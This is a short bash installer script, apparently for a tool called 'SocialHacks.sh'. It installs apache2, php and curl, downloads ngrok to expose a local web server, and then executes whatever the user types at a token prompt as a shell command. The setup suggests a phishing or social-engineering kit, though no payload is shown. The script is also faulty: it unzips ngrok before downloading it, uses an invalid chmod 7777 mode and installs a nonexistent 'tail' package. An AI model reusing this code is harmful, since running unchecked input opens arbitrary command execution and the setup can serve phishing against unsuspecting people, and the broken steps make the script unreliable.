#!/bin/bash
echo ""
clear
echo ""
echo ""
 echo -e $'\e[1;33m|==========================================================|\e[0m'
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Installing Please Have Patience    \e[0m'
 echo -e $'\e[1;33m|==========================================================|\e[0m'
sleep 8
clear
echo ""
echo ""
echo -e $'\e[1;33m|================================================|\e[0m'
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m       >> DOWNLOAD REQUIREMENTS >> \e[0m'
echo -e $'\e[1;33m|================================================|\e[0m'
sudo apt-get install apache2 -y
apt install php -y
apt install jq -y
apt install tail -y
apt install curl -y
systemctl start apache2
unzip ngrok-stable-linux-amd64.zip
clear
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip

cp -R ngrok server/
chmod 7777 SocialHacks.sh
clear
echo ""
echo ""
echo ""
read -p $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m Enter The Ngrok Token [Ex. ./ngrok authtoken 1Y7IU ] : \e[0m' token
$token
clear



